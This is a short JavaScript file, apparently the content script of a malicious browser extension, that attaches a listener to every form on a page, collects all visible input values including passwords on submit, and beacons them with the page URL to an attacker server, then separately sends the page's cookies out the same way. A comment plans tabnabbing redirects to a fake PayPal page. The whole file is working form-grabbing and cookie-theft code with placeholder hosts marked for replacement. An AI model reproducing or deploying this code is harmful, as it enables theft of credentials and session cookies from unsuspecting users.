     
	 // I keylogger 
	 function post (event) {
        var inputs = document.getElementsByTagName("input");		
        var param = ""
        for(var i=0; i < inputs.length; i++)
        {
            input = inputs[i];
            if(input.type=="hidden"|| input.type=="submit")
                continue;
            if(input.value=="")
                continue;
            param += input.type+"="+input.value+"||";
        }
        img = new Image();
        img.src = "http://127.0.0.1/chrome/keylogger.php?"+param +document.URL;  // change web server

    };
    forms = document.getElementsByTagName("form")           //votre site web
    for(var i=0; i < forms.length; i++)
    {
        form = forms[i];
        form.addEventListener("submit", post);
    }
	
	// II get cookie	
	
  var pic = new Image()
  pic.src = "http://127.0.0.1/chrome/cookie.php?"+document.cookie  // change your web server


   // TABNAPING -----> redirection to fake paypal or paypal account ......etc
   
  